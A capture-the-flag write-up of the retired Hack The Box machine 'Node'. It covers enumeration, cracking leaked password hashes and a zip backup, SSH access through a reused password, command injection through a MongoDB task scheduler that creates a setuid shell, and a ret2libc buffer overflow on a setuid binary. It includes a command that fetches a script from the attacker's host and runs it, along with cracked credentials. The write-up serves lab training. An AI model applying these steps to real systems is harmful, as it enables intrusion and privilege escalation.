# Node

This is the write-up for the box Node that got retired at the 3rd March 2018.
My IP address was 10.10.14.9 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.58    node.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/node.nmap 10.10.10.58
```

```markdown
PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-tasktracker Apache Hadoop
| hadoop-datanode-info:
|_  Logs: /login
| hadoop-tasktracker-info:
|_  Logs: /login
|_http-title: MyPlace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 3000)

Based on the port and the name of the box, we can assume that this web page runs on **Node.js**.
The web page looks like a social media website called _"MyPlace"_ and in the top right corner is a login button.

Lets search for hidden directories with **Gobuster**:
```markdown
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.58:3000
```

Unfortunately it results in an error because the web page responds with _HTTP code 200 OK_ to every request.
This happens because of the User-Agent, but changing it to something else also doesn't work so there is some kind of filter against scanning.
Send any request from the page to **Burpsuite** and this will automatically find some directories.

When browsing to _/api/users_ it reveals four usernames with hashed passwords in JSON format:
```markdown
curl http://10.10.10.58:3000/api/users
```

```json
[
  {
    "_id": "59a7365b98aa325cc03ee51c",
    "username": "myP14ceAdm1nAcc0uNT",
    "password": "dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af",
    "is_admin": true
  },
  {
    "_id": "59a7368398aa325cc03ee51d",
    "username": "tom",
    "password": "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
    "is_admin": false
  },
  {
    "_id": "59a7368e98aa325cc03ee51e",
    "username": "mark",
    "password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
    "is_admin": false
  },
  {
    "_id": "59aa9781cced6f1d1490fce9",
    "username": "rastating",
    "password": "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
    "is_admin": false
  }
]
```

When looking up what those hashes are on **hashes.org**, it finds 3 of them and says that they are SHA256PLAIN:
```markdown
dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af: manchester
f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240: spongebob
5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0: snowflake
```

Since _myP14ceAdm1nAcc0uNT_ is an admin account, we can log in with that user on the login page.

![Login with admin account](https://kyuu-ji.github.io/htb-write-up/node/node_web-1.png)

The only option on this page is to download a _"myplace.backup"_ file that is just a text file with a lot of Base64-encoded content.

### Analyzing the file

Decoding the Base64-encoded file:
```markdown
base64 -d myplace.backup > myplace.decoded
```

The command `file` says that this is ZIP archived data, so lets `unzip` it:
```markdown
unzip myplace.zip
```

It asks for a password but **fcrackzip** should find it:
```markdown
fcrackzip -D -p /usr/share/wordlists/rockyou.txt myplace.zip
```

The password is _"magicword"_ and can be used to unzip the ZIP archived data.
We now have the source code of the web application.

### Analyzing the source code

When searching for passwords, it shows that there are config files for a **MongoDB** database:
```markdown
grep -Ri password . | less
```

With this information we can find out where the MongoDB connection is controlled.
```markdown
cat app.js | grep mongo
```

```markdown
mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
```

The connection goes to _localhost:27017_ but lets see if this user reused his password for his local user account:
```markdown
ssh mark@10.10.10.58
```

He did reuse his account and we can log in on the box as the user _mark_.

## Privilege Escalation

To get an attack surface on the box, we should enumerate it with any **Linux Enumeration script**:
```markdown
curl 10.10.14.9 | LinEnum.sh
```

After analyzing the output, it shows that the user _tom_ is running a process _/usr/bin/node /var/scheduler/app.js_ which could be used to escalate privileges to his user account. The configuration file is authenticating to the MongoDB database _"scheduler"_ as _mark_, takes everything in the task collection, passes it to `exec` to execute it and then deleting the task.

To summarize: It runs a shell command once.

Login into the MongoDB database _scheduler_:
```markdown
mongo -p -u mark scheduler
```

We have to create a document with the parameter _"cmd"_ because that is how it is called in the configuration file.
```markdown
db.tasks.insert( { "cmd" : "cp /bin/dash /tmp/shell; chmod 6755 /tmp/shell;" } )

db.tasks.find()
```

This task copies `dash` into _/tmp/shell_ and sets the _setuid bit_ for it.
Shortly after the task will be executed then deleted and _/tmp/shell_ now exists and is owned by _tom_.
```markdown
/tmp/shell -p
```

After executing we are the user _tom_.

### Privilege Escalation to root

Now we can enumerate the box again or search for interesting configurations manually.
```markdown
find / -perm -4000 2>/dev/null
```

When checking the files with the _setuid bit_ set, there is one that is not a default binary called _/usr/local/bin/backup_ that is owned and executable by root and the group _admin_.
```markdown
-rwsr-xr-- 1 root admin 16484 Sep  3  2017 /usr/local/bin/backup
```

In the shell we have the _Effective UID_ of _tom_ but not the correct group permissions.
We can set those with the MongoDB command execution flaw we found earlier to change the ownership of _/tmp/shell_ to _tom_ and the group _admin_:
```markdown
db.tasks.insert( { "cmd" : "chown tom:admin /tmp/shell; chmod 6755 /tmp/shell;" } )
```
```markdown
/tmp/shell -p
```

Now the group permissions are also set and we can examine _/usr/local/bin/backup_.
When executing, it seemingly does nothing, so we should upload it to our local client to do some static analysis.

#### Binary Analysis

This binary needs three parameters or else it exits:

![Binary analysis](https://kyuu-ji.github.io/htb-write-up/node/node_binary-1.png)

Giving it three parameters and trace the system calls:
```markdown
strace ./backup 1 2 3
```

It tries to read _/etc/myplace/keys_ and this file on the box has the following content:
```markdown
a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
```

In _/var/www/myplace/app.js_ it says that this binary is used like this:
```markdown
backup [-q, backup_key, dirname]
```

So lets execute it like that:
```markdown
./backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root
```

This outputs a Base64-decoded string that we can decode and get ZIP archived data which we can unzip with the password from before and we get root.txt.
```markdown
base64 -d root.b64 > root.zip

unzip root.unzip
```

Unfortunately the contents of root.txt is a troll face.

In **Radare2** it shows different blacklisted characters and strings that are not allowed:
- ..
- /root
- ;
- &
- `
- $
- |
- /etc
- /
- //

There are several methods to bypass this blacklist that I describe in the [Unintended way write-up](https://kyuu-ji.github.io/htb-write-up/node/unintended-way-node.md).

Lets debug the binary with **gdb** and see if there is a **Buffer Overflow**.

#### Buffer Overflow

Run the binary in **gdb**:
```markdown
gdb ./backup
```

Create pattern:
```markdown
python -c 'print("A"\*512+"B"\*4)'
```

```markdown
# In gdb
b main
run abc 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
```

- 512 A's = Junk
- 513-517 = EIP Overwrite

We need the following information before we can write an exploit:
- Base address of libc:
 - `ldd /usr/local/bin/backup | grep libc.so.6`

- Offset address of system:
  - `readelf -s /lib32/libc.so.6 | grep system`
    - system@@GLIBC_2.0: 0x0003a940
- Offset address of exit
  - `readelf -s /lib32/libc.so.6 | grep exit`
    - on_exit@@GLIBC_2.0: 0x0002e7d0
- Memory address of /bin/sh
  - `strings -a -t x /lib32/libc.so.6 | grep /bin/sh`
    - /bin/sh: 0x0015900b

The Python script for the buffer overflow is called **node-bof.py** and can be found in this repository. Now we can run it on the box:
```markdown
python node-bof.py
```

After executing, it will try to brute-force the correct address because of ASLR and when it gets hit, we get a root shell!
